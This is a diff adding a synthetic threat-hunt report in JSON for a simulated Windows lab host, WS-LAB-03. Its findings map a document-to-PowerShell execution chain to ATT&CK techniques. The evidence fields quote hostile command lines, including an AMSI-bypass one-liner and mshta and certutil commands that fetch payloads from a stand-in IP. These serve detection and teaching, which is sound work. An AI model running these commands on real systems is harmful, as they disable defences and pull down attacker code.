@@ -1,0 +1,1652 @@
+{
+  "ReportFormatVersion": 1,
+  "GeneratedAt": "2026-10-16T17:06:35.850Z",
+  "Result": {
+    "SchemaVersion": 1,
+    "Kind": "WthHuntResult",
+    "ToolVersion": "1.0.0",
+    "Host": "WS-LAB-03",
+    "DataOrigin": "Synthetic",
+    "SnapshotDescription": "SIMULATED lab host showing a document-to-PowerShell execution chain, failed logons, and gaps in coverage (no Sysmon, no elevation). Synthetic data, not collected from a real endpoint.",
+    "CollectedAt": "2026-10-16T09:30:00.000Z",
+    "HuntStartedAt": "2026-10-16T17:06:33.176Z",
+    "HuntCompletedAt": "2026-10-16T17:06:35.820Z",
+    "Elevated": false,
+    "Summary": {
+      "ActiveFindings": 20,
+      "SuppressedFindings": 0,
+      "BySeverity": {
+        "Critical": 0,
+        "High": 6,
+        "Medium": 11,
+        "Low": 3,
+        "Informational": 0
+      },
+      "ByConfidence": {
+        "High": 1,
+        "Medium": 13,
+        "Low": 6
+      },
+      "ByFindingType": {
+        "Observation": 7,
+        "Heuristic": 13
+      },
+      "ItemsAnalyzed": 35,
+      "RulesExecuted": 21,
+      "RulesSkipped": 21,
+      "RulesFilteredOut": 0
+    },
+    "Findings": [
+      {
+        "FindingId": "WTH-F-b5bfc0a18088",
+        "Host": "WS-LAB-03",
+        "ObservedAt": "2026-10-16T09:30:00.000Z",
+        "ObservedAtBasis": "CollectionTime",
+        "CollectedAt": "2026-10-16T09:30:00.000Z",
+        "TimeZoneContext": "All timestamps are UTC (ISO 8601).",
+        "RuleId": "WTH-DEF-001",
+        "RuleVersion": "1.0.0",
+        "RuleName": "Windows Defender real-time protection is off while Defender is the active antivirus",
+        "Title": "Defender real-time protection is disabled",
+        "Category": "Defender",
+        "DataSource": "DefenderStatus",
+        "Severity": "High",
+        "Confidence": "Medium",
+        "FindingType": "Observation",
+        "Explanation": "Defender is running in normal mode but real-time protection or the antivirus engine is reported as disabled. Attackers disable real-time protection to run tools undetected. It is also turned off by administrators for troubleshooting and when another product takes over, which is why passive mode is excluded.",
+        "EvidenceRequirements": [
+          "Get-MpComputerStatus (AMRunningMode, RealTimeProtectionEnabled, AntivirusEnabled)"
+        ],
+        "Evidence": {
+          "AMRunningMode": "Normal",
+          "AntivirusEnabled": true,
+          "RealTimeProtectionEnabled": false,
+          "BehaviorMonitorEnabled": true,
+          "IsTamperProtected": true,
+          "AntivirusSignatureLastUpdated": "2026-10-07T09:00:00.000Z"
+        },
+        "Attack": [
+          {
+            "Id": "T1562.001",
+            "Name": "Impair Defenses: Disable or Modify Tools",
+            "Tactics": [
+              "Defense Evasion"
+            ],
+            "Url": "https://attack.mitre.org/techniques/T1562/001/"
+          }
+        ],
+        "FalsePositives": [
+          "Temporary troubleshooting by an administrator",
+          "A third-party product that was installed or removed recently"
+        ],
+        "RecommendedNextStep": "Check Defender operational events 5001/5007 and Group Policy/MDM for who changed the setting and when. Confirm whether another endpoint protection product is expected.",
+        "Remediation": "An authorized administrator could re-enable protection through policy once the reason for the change is understood. This toolkit never changes the system; any action is a manual decision for an authorized responder after validation.",
+        "Limitations": [],
+        "ConfigOverrides": [],
+        "OccurrenceCount": 1,
+        "Suppressed": false,
+        "SuppressionId": null,
+        "SuppressionReason": null
+      },
+      {
+        "FindingId": "WTH-F-82feb80d52a0",
+        "Host": "WS-LAB-03",
+        "ObservedAt": "2026-10-16T09:22:00.000Z",
+        "ObservedAtBasis": "EventTime",
+        "CollectedAt": "2026-10-16T09:30:00.000Z",
+        "TimeZoneContext": "All timestamps are UTC (ISO 8601).",
+        "RuleId": "WTH-DEF-002",
+        "RuleVersion": "1.0.0",
+        "RuleName": "Windows Defender reported a detection",
+        "Title": "Defender event 1116: Trojan:Win32/SyntheticLab.A",
+        "Category": "Defender",
+        "DataSource": "DefenderEvent",
+        "Severity": "High",
+        "Confidence": "Medium",
+        "FindingType": "Observation",
+        "Explanation": "A Defender malware detection (event 1116) or remediation action (event 1117) was logged within the collection window. Defender is reporting that it found or acted on something suspicious. The detection itself is reliable evidence that Defender saw the item, but it does not show whether the threat ran or persists.",
+        "EvidenceRequirements": [
+          "Microsoft-Windows-Windows Defender/Operational events 1116 and 1117"
+        ],
+        "Evidence": {
+          "EventId": 1116,
+          "TimeCreated": "2026-10-16T09:22:00.000Z",
+          "Data.ThreatName": "Trojan:Win32/SyntheticLab.A",
+          "Data.SeverityName": "Severe",
+          "Data.CategoryName": "Trojan",
+          "Data.Path": "file:_C:\\Users\\<user:17c0d5>\\AppData\\Local\\Temp\\p.bin",
+          "Data.ProcessName": "C:\\Windows\\System32\\certutil.exe",
+          "Data.DetectionUser": "WS-LAB-03\\<user:17c0d5>"
+        },
+        "Attack": [],
+        "FalsePositives": [
+          "Test files such as the EICAR string",
+          "Quarantined downloads that never executed"
+        ],
+        "RecommendedNextStep": "Check whether the remediation succeeded, whether the file executed first (Sysmon, process telemetry), and look for related persistence or network findings.",
+        "Remediation": "Follow your incident response process; Defender may already have quarantined the item. This toolkit never changes the system; any action is a manual decision for an authorized responder after validation.",
+        "Limitations": [
+          "A detection is not an ATT&CK technique, so this rule has no ATT&CK mapping."
+        ],
+        "ConfigOverrides": [],
+        "OccurrenceCount": 1,
+        "Suppressed": false,
+        "SuppressionId": null,
+        "SuppressionReason": null
+      },
+      {
+        "FindingId": "WTH-F-5737662fb5a1",
+        "Host": "WS-LAB-03",
+        "ObservedAt": "2026-10-16T09:27:00.000Z",
+        "ObservedAtBasis": "EventTime",
+        "CollectedAt": "2026-10-16T09:30:00.000Z",
+        "TimeZoneContext": "All timestamps are UTC (ISO 8601).",
+        "RuleId": "WTH-EVT-002",
+        "RuleVersion": "1.0.0",
+        "RuleName": "Security event log was cleared",
+        "Title": "Security log cleared at 2026-10-16T09:27:00.000Z",
+        "Category": "DefenseEvasion",
+        "DataSource": "Event.Security",
+        "Severity": "High",
+        "Confidence": "Medium",
+        "FindingType": "Observation",
+        "Explanation": "Security event 1102 records that the Security audit log was cleared. Clearing the Security log removes evidence and is used by attackers, but administrators also clear logs for maintenance.",
+        "EvidenceRequirements": [
+          "Security log event 1102 (requires an elevated session or Event Log Readers membership)"
+        ],
+        "Evidence": {
+          "EventId": 1102,
+          "TimeCreated": "2026-10-16T09:27:00.000Z",
+          "Data.SubjectUserName": "<user:17c0d5>",
+          "Data.SubjectDomainName": "WS-LAB-03"
+        },
+        "Attack": [
+          {
+            "Id": "T1070.001",
+            "Name": "Indicator Removal: Clear Windows Event Logs",
+            "Tactics": [
+              "Defense Evasion"
+            ],
+            "Url": "https://attack.mitre.org/techniques/T1070/001/"
+          }
+        ],
+        "FalsePositives": [
+          "Planned log maintenance or imaging",
+          "Lab machines that are reset regularly"
+        ],
+        "RecommendedNextStep": "Identify the account (SubjectUserName), the logon session and what happened just before the event. Check for forwarded copies of the log in a SIEM.",
+        "Remediation": "Preserve remaining logs and forward them centrally. This toolkit never changes the system; any action is a manual decision for an authorized responder after validation.",
+        "Limitations": [],
+        "ConfigOverrides": [],
+        "OccurrenceCount": 1,
+        "Suppressed": false,
+        "SuppressionId": null,
+        "SuppressionReason": null
+      },
+      {
+        "FindingId": "WTH-F-8e1e93bd692a",
+        "Host": "WS-LAB-03",
+        "ObservedAt": "2026-10-16T09:30:00.000Z",
+        "ObservedAtBasis": "CollectionTime",
+        "CollectedAt": "2026-10-16T09:30:00.000Z",
+        "TimeZoneContext": "All timestamps are UTC (ISO 8601).",
+        "RuleId": "WTH-PROC-003",
+        "RuleVersion": "1.0.0",
+        "RuleName": "Office application started a script interpreter",
+        "Title": "WINWORD.EXE started cmd.exe (PID 6100)",
+        "Category": "Execution",
+        "DataSource": "Process",
+        "Severity": "High",
+        "Confidence": "Medium",
+        "FindingType": "Heuristic",
+        "Explanation": "An Office application is the parent of cmd.exe, PowerShell, a script host, mshta, rundll32, regsvr32 or wmic. Documents that run macros or exploit the application commonly launch an interpreter. Legitimate Office add-ins and automation can also do this, so the document and user context matter.",
+        "EvidenceRequirements": [
+          "Process inventory with parent names (parent is recorded only when the parent started before the child)"
+        ],
+        "Evidence": {
+          "ProcessId": 6100,
+          "Name": "cmd.exe",
+          "ParentProcessId": 6000,
+          "ParentName": "WINWORD.EXE",
+          "CommandLine": "cmd.exe /c powershell.exe -NoP -W Hidden -Enc VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAHMAeQBuAHQAaABlAHQAaQBjAC0AbABhAGIALQBtAGEAcgBrAGUAcgAnAA==",
+          "CreationTime": "2026-10-16T08:21:00.000Z"
+        },
+        "Attack": [
+          {
+            "Id": "T1204.002",
+            "Name": "User Execution: Malicious File",
+            "Tactics": [
+              "Execution"
+            ],
+            "Url": "https://attack.mitre.org/techniques/T1204/002/"
+          }
+        ],
+        "FalsePositives": [
+          "Office add-ins and macros used by the business",
+          "Print or export automation that calls cmd.exe"
+        ],
+        "RecommendedNextStep": "Identify the document that was open, how it arrived, and the full child command line. Check recent email or download activity for the user.",
+        "Remediation": "If the activity is not approved, an authorized responder could contain the host and preserve the document and process tree. This toolkit never changes the system; any action is a manual decision for an authorized responder after validation.",
+        "Limitations": [
+          "The process snapshot may miss short-lived children; Sysmon event 1 (WTH-EVT-008) is more complete when available."
+        ],
+        "ConfigOverrides": [],
+        "OccurrenceCount": 1,
+        "Suppressed": false,
+        "SuppressionId": null,
+        "SuppressionReason": null
+      },
+      {
+        "FindingId": "WTH-F-bd2c24ecb605",
+        "Host": "WS-LAB-03",
+        "ObservedAt": "2026-10-16T09:30:00.000Z",
+        "ObservedAtBasis": "CollectionTime",
+        "CollectedAt": "2026-10-16T09:30:00.000Z",
+        "TimeZoneContext": "All timestamps are UTC (ISO 8601).",
+        "RuleId": "WTH-PROC-005",
+        "RuleVersion": "1.0.0",
+        "RuleName": "System process name running outside System32",
+        "Title": "svchost.exe (PID 6400) is running from an unexpected path",
+        "Category": "Execution",
+        "DataSource": "Process",
+        "Severity": "High",
+        "Confidence": "Medium",
+        "FindingType": "Heuristic",
+        "Explanation": "A process with the name of a core Windows process (svchost.exe, lsass.exe, csrss.exe and similar) runs from a path outside System32 and SysWOW64. Malware commonly copies a trusted process name to blend in. Core processes should always run from the Windows system directories.",
+        "EvidenceRequirements": [
+          "Process inventory with executable paths (protected processes may hide their path without elevation)"
+        ],
+        "Evidence": {
+          "ProcessId": 6400,
+          "ParentProcessId": 6200,
+          "Name": "svchost.exe",
+          "ExecutablePath": "C:\\Users\\<user:17c0d5>\\AppData\\Local\\Temp\\svchost.exe",
+          "CommandLine": "svchost.exe",
+          "ParentName": "powershell.exe",
+          "CreationTime": "2026-10-16T08:23:00.000Z"
+        },
+        "Attack": [
+          {
+            "Id": "T1036.005",
+            "Name": "Masquerading: Match Legitimate Name or Location",
+            "Tactics": [
+              "Defense Evasion"
+            ],
+            "Url": "https://attack.mitre.org/techniques/T1036/005/"
+          }
+        ],
+        "FalsePositives": [
+          "Renamed copies of tools used for testing",
+          "Side-by-side servicing activity (rare)"
+        ],
+        "RecommendedNextStep": "Compare the file hash with the system copy, check the signature, the parent process and the process tree.",
+        "Remediation": "If the process is malicious, an authorized responder should preserve memory and the binary before any containment action. This toolkit never changes the system; any action is a manual decision for an authorized responder after validation.",
+        "Limitations": [],
+        "ConfigOverrides": [],
+        "OccurrenceCount": 1,
+        "Suppressed": false,
+        "SuppressionId": null,
+        "SuppressionReason": null
+      },
+      {
+        "FindingId": "WTH-F-8f9b6549d6b5",
+        "Host": "WS-LAB-03",
+        "ObservedAt": "2026-10-16T09:17:00.000Z",
+        "ObservedAtBasis": "EventTime",
+        "CollectedAt": "2026-10-16T09:30:00.000Z",
+        "TimeZoneContext": "All timestamps are UTC (ISO 8601).",
+        "RuleId": "WTH-XDR-002",
+        "RuleVersion": "1.0.0",
+        "RuleName": "Imported alert: High severity",
+        "Title": "Imported alert: Suspicious PowerShell command line",
+        "Category": "Imported",
+        "DataSource": "DefenderXdr",
+        "Severity": "High",
+        "Confidence": "Medium",
+        "FindingType": "Observation",
+        "Explanation": "An imported Defender XDR alert row has severity High. The alert was produced by Defender XDR analytics. This toolkit surfaces it with the rest of the findings; it does not re-evaluate the alert logic.",
+        "EvidenceRequirements": [
+          "Imported alert rows with Title and Severity"
+        ],
+        "Evidence": {
+          "TimeCreated": "2026-10-16T09:17:00.000Z",
+          "DeviceName": "WS-LAB-03",
+          "AlertId": "da637000000000000001_1",
+          "Title": "Suspicious PowerShell command line",
+          "Severity": "High",
+          "Category": "Execution"
+        },
+        "Attack": [],
+        "FalsePositives": [
+          "Alerts triggered by authorized testing"
+        ],
+        "RecommendedNextStep": "Open the alert in Defender XDR and review the evidence and the incident it belongs to.",
+        "Remediation": "Follow your incident response process in Defender XDR. This toolkit never changes the system; any action is a manual decision for an authorized responder after validation.",
+        "Limitations": [
+          "An alert is not an ATT&CK technique mapping; use the alert's own technique tags in Defender XDR."
+        ],
+        "ConfigOverrides": [],
+        "OccurrenceCount": 1,
+        "Suppressed": false,
+        "SuppressionId": null,
+        "SuppressionReason": null
+      },
+      {
+        "FindingId": "WTH-F-0316008a93e0",
+        "Host": "WS-LAB-03",
+        "ObservedAt": "2026-10-16T09:18:00.000Z",
+        "ObservedAtBasis": "EventTime",
+        "CollectedAt": "2026-10-16T09:30:00.000Z",
+        "TimeZoneContext": "All timestamps are UTC (ISO 8601).",
+        "RuleId": "WTH-DEF-005",
+        "RuleVersion": "1.0.0",
+        "RuleName": "Windows Defender real-time protection was disabled (event 5001)",
+        "Title": "Defender real-time protection disabled at 2026-10-16T09:18:00.000Z",
+        "Category": "Defender",
+        "DataSource": "DefenderEvent",
+        "Severity": "Medium",
+        "Confidence": "Medium",
+        "FindingType": "Observation",
+        "Explanation": "Defender logged event 5001 (real-time protection disabled) within the collection window. The event shows the setting was turned off at that time, whether by an administrator, a policy or a user.",
+        "EvidenceRequirements": [
+          "Microsoft-Windows-Windows Defender/Operational event 5001"
+        ],
+        "Evidence": {
+          "EventId": 5001,
+          "TimeCreated": "2026-10-16T09:18:00.000Z",
+          "Data.ProductName": "Microsoft Defender Antivirus",
+          "Data.ProductVersion": "4.18.24090.11"
+        },
+        "Attack": [
+          {
+            "Id": "T1562.001",
+            "Name": "Impair Defenses: Disable or Modify Tools",
+            "Tactics": [
+              "Defense Evasion"
+            ],
+            "Url": "https://attack.mitre.org/techniques/T1562/001/"
+          }
+        ],
+        "FalsePositives": [
+          "Administrators troubleshooting performance or compatibility",
+          "Installation of another endpoint protection product"
+        ],
+        "RecommendedNextStep": "Correlate with the logon session and process activity around the event time and with change tickets.",
+        "Remediation": "An authorized administrator could re-enable protection after the reason is understood. This toolkit never changes the system; any action is a manual decision for an authorized responder after validation.",
+        "Limitations": [],
+        "ConfigOverrides": [],
+        "OccurrenceCount": 1,
+        "Suppressed": false,
+        "SuppressionId": null,
+        "SuppressionReason": null
+      },
+      {
+        "FindingId": "WTH-F-ae9e3a0c9ef8",
+        "Host": "WS-LAB-03",
+        "ObservedAt": "2026-10-16T09:07:00.000Z",
+        "ObservedAtBasis": "EventTime",
+        "CollectedAt": "2026-10-16T09:30:00.000Z",
+        "TimeZoneContext": "All timestamps are UTC (ISO 8601).",
+        "RuleId": "WTH-EVT-001",
+        "RuleVersion": "1.0.0",
+        "RuleName": "Many failed logons for one account from one source",
+        "Title": "12 failed logons for <user:17c0d5> from 198.51.100.23 within 10 minutes",
+        "Category": "Authentication",
+        "DataSource": "Event.Security",
+        "Severity": "Medium",
+        "Confidence": "Low",
+        "FindingType": "Heuristic",
+        "Explanation": "The number of failed logons (Security 4625) for the same account name and source address within the window reaches the threshold (default 10 in 10 minutes). Password guessing and spraying produce bursts of failed logons. Mistyped passwords, stale service credentials and vulnerability scanners produce the same pattern, so the threshold, grouping and source matter.",
+        "EvidenceRequirements": [
+          "Security log event 4625 (requires an elevated session or Event Log Readers membership)",
+          "Audit Logon policy (failure) enabled"
+        ],
+        "Evidence": {
+          "Data.TargetUserName": "<user:17c0d5>",
+          "Data.IpAddress": "198.51.100.23",
+          "Data.LogonType": "3",
+          "Data.Status": "0xc000006d",
+          "Data.WorkstationName": "KALI-LAB",
+          "Count": 12,
+          "Threshold": 10,
+          "WindowMinutes": 10,
+          "FirstSeen": "2026-10-16T09:02:00.000Z",
+          "LastSeen": "2026-10-16T09:07:00.000Z"
+        },
+        "Attack": [
+          {
+            "Id": "T1110",
+            "Name": "Brute Force",
+            "Tactics": [
+              "Credential Access"
+            ],
+            "Url": "https://attack.mitre.org/techniques/T1110/"
+          }
+        ],
+        "FalsePositives": [
+          "Users who mistyped a password or have stale saved credentials",
+          "Service accounts with an expired password",
+          "Authorized vulnerability or password audits"
+        ],
+        "RecommendedNextStep": "Check whether any 4624 success follows from the same source, the logon type and source address, and whether the account is local or domain. Review the account lockout state.",
+        "Remediation": "If the activity is not approved, an authorized responder could block the source address and review the account after validating impact. This toolkit never changes the system; any action is a manual decision for an authorized responder after validation.",
+        "Limitations": [
+          "A burst of failures does not prove compromise. If the Security log was cleared or has rotated, earlier failures are not visible."
+        ],
+        "ConfigOverrides": [],
+        "OccurrenceCount": 1,
+        "Suppressed": false,
+        "SuppressionId": null,
+        "SuppressionReason": null
+      },
+      {
+        "FindingId": "WTH-F-869db932023d",
+        "Host": "WS-LAB-03",
+        "ObservedAt": "2026-10-16T09:21:00.000Z",
+        "ObservedAtBasis": "EventTime",
+        "CollectedAt": "2026-10-16T09:30:00.000Z",
+        "TimeZoneContext": "All timestamps are UTC (ISO 8601).",
+        "RuleId": "WTH-EVT-006",
+        "RuleVersion": "1.0.0",
+        "RuleName": "Suspicious content in PowerShell script block log",
+        "Title": "PowerShell script block 00000000-0000-0000-0000-000000000004 contains suspicious content",
+        "Category": "Execution",
+        "DataSource": "Event.PowerShell",
+        "Severity": "Medium",
+        "Confidence": "Medium",
+        "FindingType": "Heuristic",
+        "Explanation": "A PowerShell script block (event 4104) contains a download cradle, AMSI tampering strings, reflective assembly loading, VirtualAlloc, or a Defender exclusion command. Script block logging records deobfuscated script text, so these strings are meaningful. Security tools and administrators can also contain them.",
+        "EvidenceRequirements": [
+          "PowerShell Operational event 4104 (script block logging must be enabled)"
+        ],
+        "Evidence": {
+          "TimeCreated": "2026-10-16T09:21:00.000Z",
+          "Data.ScriptBlockId": "00000000-0000-0000-0000-000000000004",
+          "Data.Path": "",
+          "Data.ScriptBlockText": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
+        },
+        "Attack": [
+          {
+            "Id": "T1059.001",
+            "Name": "Command and Scripting Interpreter: PowerShell",
+            "Tactics": [
+              "Execution"
+            ],
+            "Url": "https://attack.mitre.org/techniques/T1059/001/"
+          }
+        ],
+        "FalsePositives": [
+          "Security assessment and red-team tooling run with authorization",
+          "Administrator scripts that download installers"
+        ],
+        "RecommendedNextStep": "Read the full script block (and the other parts if it was split), and identify the user, host process and parent. Review related network and file activity.",
+        "Remediation": "If the script is not approved, an authorized responder could contain the host after preserving logs. This toolkit never changes the system; any action is a manual decision for an authorized responder after validation.",
+        "Limitations": [
+          "Long script blocks are split across events; only the part that matched is evaluated per event."
+        ],
+        "ConfigOverrides": [],
+        "OccurrenceCount": 1,
+        "Suppressed": false,
+        "SuppressionId": null,
+        "SuppressionReason": null
+      },
+      {
+        "FindingId": "WTH-F-b1bb1af5bf56",
+        "Host": "WS-LAB-03",
+        "ObservedAt": "2026-10-16T09:30:00.000Z",
+        "ObservedAtBasis": "CollectionTime",
+        "CollectedAt": "2026-10-16T09:30:00.000Z",
+        "TimeZoneContext": "All timestamps are UTC (ISO 8601).",
+        "RuleId": "WTH-NET-001",
+        "RuleVersion": "1.0.0",
+        "RuleName": "Listening socket owned by a process in a user-writable path",
+        "Title": "beacon.exe listens on port 4444 from a user-writable path",
+        "Category": "Network",
+        "DataSource": "NetworkConnection",
+        "Severity": "Medium",
+        "Confidence": "Low",
+        "FindingType": "Heuristic",
+        "Explanation": "A process whose executable lives in a user-writable directory is listening on a non-loopback address. A listener outside loopback can accept connections from the network. Per-user server software (development servers, sync tools) also listens, so an unexpected owner is the signal, not the port.",
+        "EvidenceRequirements": [
+          "Listening sockets with owning process",
+          "Process executable path for the owning PID"
+        ],
+        "Evidence": {
+          "Protocol": "TCP",
+          "LocalAddress": "0.0.0.0",
+          "LocalPort": 4444,
+          "OwningProcess": 6700,
+          "ProcessName": "beacon.exe",
+          "ProcessPath": "C:\\Users\\<user:17c0d5>\\AppData\\Local\\Tool\\beacon.exe"
+        },
+        "Attack": [],
+        "FalsePositives": [
+          "Developer tools and local web servers",
+          "Peer-to-peer or sync clients installed per user"
+        ],
+        "RecommendedNextStep": "Identify the process, its parent and start time, and whether the port is reachable from other hosts (host firewall rules). Check for matching persistence findings.",
+        "Remediation": "If the listener is not approved, an authorized responder could block the port at the network layer and investigate the process. This toolkit never changes the system; any action is a manual decision for an authorized responder after validation.",
+        "Limitations": [
+          "A listening port by itself is not a technique, so this rule has no ATT&CK mapping."
+        ],
+        "ConfigOverrides": [],
+        "OccurrenceCount": 1,
+        "Suppressed": false,
+        "SuppressionId": null,
+        "SuppressionReason": null
+      },
+      {
+        "FindingId": "WTH-F-ef4606394d79",
+        "Host": "WS-LAB-03",
+        "ObservedAt": "2026-10-16T09:30:00.000Z",
+        "ObservedAtBasis": "CollectionTime",
+        "CollectedAt": "2026-10-16T09:30:00.000Z",
+        "TimeZoneContext": "All timestamps are UTC (ISO 8601).",
+        "RuleId": "WTH-NET-002",
+        "RuleVersion": "1.0.0",
+        "RuleName": "Established outbound connection from a script host or proxy-execution binary",
+        "Title": "mshta.exe has an established connection to 203.0.113.50:443",
+        "Category": "Network",
+        "DataSource": "NetworkConnection",
+        "Severity": "Medium",
+        "Confidence": "Low",
+        "FindingType": "Heuristic",
+        "Explanation": "wscript, cscript, mshta, regsvr32, rundll32, certutil or bitsadmin has an established connection to a public IP address. These binaries rarely need direct internet access in normal use, and attackers use them to fetch or run remote content. Some enterprise software legitimately drives them over the network.",
+        "EvidenceRequirements": [
+          "Established TCP connections with owning process",
+          "Process name for the owning PID"
+        ],
+        "Evidence": {
+          "Protocol": "TCP",
+          "State": "Established",
+          "LocalAddress": "10.20.0.31",
+          "LocalPort": 50123,
+          "RemoteAddress": "203.0.113.50",
+          "RemotePort": 443,
+          "OwningProcess": 6600,
+          "ProcessName": "mshta.exe",
+          "ProcessPath": "C:\\Windows\\System32\\mshta.exe"
+        },
+        "Attack": [
+          {
+            "Id": "T1218",
+            "Name": "System Binary Proxy Execution",
+            "Tactics": [
+              "Defense Evasion"
+            ],
+            "Url": "https://attack.mitre.org/techniques/T1218/"
+          }
+        ],
+        "FalsePositives": [
+          "Software deployment or licensing tools that call these binaries",
+          "Windows components that briefly use rundll32 for network features"
+        ],
+        "RecommendedNextStep": "Look up the remote address in your threat intelligence and DNS/proxy logs, find the parent process and command line, and review what the process loaded.",
+        "Remediation": "If the connection is not approved, an authorized responder could block the destination and contain the host after preserving evidence. This toolkit never changes the system; any action is a manual decision for an authorized responder after validation.",
+        "Limitations": [
+          "A connection is a point-in-time observation; an unfamiliar address is not proof of malicious activity."
+        ],
+        "ConfigOverrides": [],
+        "OccurrenceCount": 1,
+        "Suppressed": false,
+        "SuppressionId": null,
+        "SuppressionReason": null
+      },
+      {
+        "FindingId": "WTH-F-5504cbb1d332",
+        "Host": "WS-LAB-03",
+        "ObservedAt": "2026-10-16T09:30:00.000Z",
+        "ObservedAtBasis": "CollectionTime",
+        "CollectedAt": "2026-10-16T09:30:00.000Z",
+        "TimeZoneContext": "All timestamps are UTC (ISO 8601).",
+        "RuleId": "WTH-PROC-002",
+        "RuleVersion": "1.0.0",
+        "RuleName": "PowerShell started with an encoded command",
+        "Title": "PowerShell PID 6200 was started with an encoded command",
+        "Category": "Execution",
+        "DataSource": "Process",
+        "Severity": "Medium",
+        "Confidence": "Medium",
+        "FindingType": "Heuristic",
+        "Explanation": "A PowerShell process was started with -EncodedCommand (or an unambiguous abbreviation) followed by a base64 payload. Encoding hides script content from casual review and is frequently used to deliver or stage payloads. Management tools also use it to avoid quoting problems, so the command must be decoded and read.",
+        "EvidenceRequirements": [
+          "Process inventory with command lines (other users' command lines need an elevated session)"
+        ],
+        "Evidence": {
+          "ProcessId": 6200,
+          "ParentProcessId": 6100,
+          "Name": "powershell.exe",
+          "ParentName": "cmd.exe",
+          "CommandLine": "powershell.exe -NoP -W Hidden -Enc VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAHMAeQBuAHQAaABlAHQAaQBjAC0AbABhAGIALQBtAGEAcgBrAGUAcgAnAA==",
+          "CreationTime": "2026-10-16T08:21:00.000Z"
+        },
+        "Attack": [
+          {
+            "Id": "T1059.001",
+            "Name": "Command and Scripting Interpreter: PowerShell",
+            "Tactics": [
+              "Execution"
+            ],
+            "Url": "https://attack.mitre.org/techniques/T1059/001/"
+          },
+          {
+            "Id": "T1027.010",
+            "Name": "Obfuscated Files or Information: Command Obfuscation",
+            "Tactics": [
+              "Defense Evasion"
+            ],
+            "Url": "https://attack.mitre.org/techniques/T1027/010/"
+          }
+        ],
+        "FalsePositives": [
+          "Configuration management and deployment tools",
+          "Monitoring agents",
+          "Administrators wrapping scripts for remote execution"
+        ],
+        "RecommendedNextStep": "Decode the payload offline (do not run it), review the parent process, and look for matching PowerShell script block events (4104).",
+        "Remediation": "If the activity is not approved, an authorized responder could contain the host and collect the process tree before taking action. This toolkit never changes the system; any action is a manual decision for an authorized responder after validation.",
+        "Limitations": [],
+        "ConfigOverrides": [],
+        "OccurrenceCount": 1,
+        "Suppressed": false,
+        "SuppressionId": null,
+        "SuppressionReason": null
+      },
+      {
+        "FindingId": "WTH-F-6292b6ca8075",
+        "Host": "WS-LAB-03",
+        "ObservedAt": "2026-10-16T09:30:00.000Z",
+        "ObservedAtBasis": "CollectionTime",
+        "CollectedAt": "2026-10-16T09:30:00.000Z",
+        "TimeZoneContext": "All timestamps are UTC (ISO 8601).",
+        "RuleId": "WTH-PROC-004",
+        "RuleVersion": "1.0.0",
+        "RuleName": "Living-off-the-land command line pattern",
+        "Title": "mshta.exe (PID 6600) matches a living-off-the-land pattern",
+        "Category": "Execution",
+        "DataSource": "Process",
+        "Severity": "Medium",
+        "Confidence": "Medium",
+        "FindingType": "Heuristic",
+        "Explanation": "A command line matches a known abuse pattern for built-in binaries: certutil -urlcache, regsvr32 with a remote scriptlet, rundll32 with javascript or mshtml, mshta with a URL, bitsadmin /transfer, or wmic process call create. Attackers use signed system binaries to download or execute content. Each binary has legitimate uses, so the specific arguments are what make the pattern notable.",
+        "EvidenceRequirements": [
+          "Process inventory with command lines"
+        ],
+        "Evidence": {
+          "ProcessId": 6600,
+          "Name": "mshta.exe",
+          "ParentName": "powershell.exe",
+          "CommandLine": "mshta.exe http://203.0.113.50/a.hta",
+          "CreationTime": "2026-10-16T08:25:00.000Z"
+        },
+        "Attack": [
+          {
+            "Id": "T1218",
+            "Name": "System Binary Proxy Execution",
+            "Tactics": [
+              "Defense Evasion"
+            ],
+            "Url": "https://attack.mitre.org/techniques/T1218/"
+          },
+          {
+            "Id": "T1105",
+            "Name": "Ingress Tool Transfer",
+            "Tactics": [
+              "Command and Control"
+            ],
+            "Url": "https://attack.mitre.org/techniques/T1105/"
+          }
+        ],
+        "FalsePositives": [
+          "Administrative scripts that use certutil or bitsadmin to move files",
+          "Software deployment using regsvr32 /i for COM registration"
+        ],
+        "RecommendedNextStep": "Review the full command line and URL, the parent process, and any file the command created. Check network connections for the same PID.",
+        "Remediation": "If the activity is not approved, an authorized responder could contain the host and preserve the downloaded content. This toolkit never changes the system; any action is a manual decision for an authorized responder after validation.",
+        "Limitations": [],
+        "ConfigOverrides": [],
+        "OccurrenceCount": 1,
+        "Suppressed": false,
+        "SuppressionId": null,
+        "SuppressionReason": null
+      },
+      {
+        "FindingId": "WTH-F-a3d369b507f9",
+        "Host": "WS-LAB-03",
+        "ObservedAt": "2026-10-16T09:30:00.000Z",
+        "ObservedAtBasis": "CollectionTime",
+        "CollectedAt": "2026-10-16T09:30:00.000Z",
+        "TimeZoneContext": "All timestamps are UTC (ISO 8601).",
+        "RuleId": "WTH-PROC-004",
+        "RuleVersion": "1.0.0",
+        "RuleName": "Living-off-the-land command line pattern",
+        "Title": "certutil.exe (PID 6300) matches a living-off-the-land pattern",
+        "Category": "Execution",
+        "DataSource": "Process",
+        "Severity": "Medium",
+        "Confidence": "Medium",
+        "FindingType": "Heuristic",
+        "Explanation": "A command line matches a known abuse pattern for built-in binaries: certutil -urlcache, regsvr32 with a remote scriptlet, rundll32 with javascript or mshtml, mshta with a URL, bitsadmin /transfer, or wmic process call create. Attackers use signed system binaries to download or execute content. Each binary has legitimate uses, so the specific arguments are what make the pattern notable.",
+        "EvidenceRequirements": [
+          "Process inventory with command lines"
+        ],
+        "Evidence": {
+          "ProcessId": 6300,
+          "Name": "certutil.exe",
+          "ParentName": "powershell.exe",
+          "CommandLine": "certutil.exe -urlcache -split -f http://203.0.113.50/payload.bin C:\\Users\\<user:17c0d5>\\AppData\\Local\\Temp\\p.bin",
+          "CreationTime": "2026-10-16T08:22:00.000Z"
+        },
+        "Attack": [
+          {
+            "Id": "T1218",
+            "Name": "System Binary Proxy Execution",
+            "Tactics": [
+              "Defense Evasion"
+            ],
+            "Url": "https://attack.mitre.org/techniques/T1218/"
+          },
+          {
+            "Id": "T1105",
+            "Name": "Ingress Tool Transfer",
+            "Tactics": [
+              "Command and Control"
+            ],
+            "Url": "https://attack.mitre.org/techniques/T1105/"
+          }
+        ],
+        "FalsePositives": [
+          "Administrative scripts that use certutil or bitsadmin to move files",
+          "Software deployment using regsvr32 /i for COM registration"
+        ],
